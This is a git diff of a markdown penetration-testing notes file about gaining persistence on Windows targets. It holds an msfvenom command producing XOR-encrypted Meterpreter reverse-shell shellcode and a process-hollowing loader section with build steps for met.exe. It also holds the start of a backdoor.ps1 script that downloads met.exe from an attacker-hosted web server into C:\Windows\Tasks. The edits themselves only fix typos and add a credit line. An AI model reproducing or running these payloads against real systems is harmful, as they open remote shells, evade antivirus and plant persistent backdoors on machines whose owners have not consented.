@@ -6,7 +6,8 @@ This workflow works great for persistence when on a target. Everytime you root a
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 --encrypt xor --encrypt-key $(printf "\x6A") -f csharp
 ```
 
-## Process Hollowing: (https://github.com/chvancooten/OSEP-Code-Snippets/tree/main/Shellcode%20Process%20Hollowing)
+## Process Hollowing:
+Credi: (https://github.com/chvancooten/OSEP-Code-Snippets/tree/main/Shellcode%20Process%20Hollowing)
 Make sure you add the decoding routine with the byte that you generated. In this case it is x6A
 ```
 ﻿using System;
@@ -165,12 +166,13 @@ namespace ProcessHollowing
 ```
 
 ## Build on Linux
+Host met.exe in /var/www/html/
 ```
-mcs proccesshollowingcs -r:System.Security.dll -out:met.exe
+mcs proccesshollowing.cs -r:System.Security.dll -out:met.exe
 ```
 
 ## backdoor.ps1
-Host this file in /var/www/html/
+Host backdoor.ps1 file in /var/www/html/
 ```
 $Url          = "http://192.168.x.x/met.exe"          # ← your IP/port
 $OutputPath   = "C:\Windows\Tasks\met.exe"                
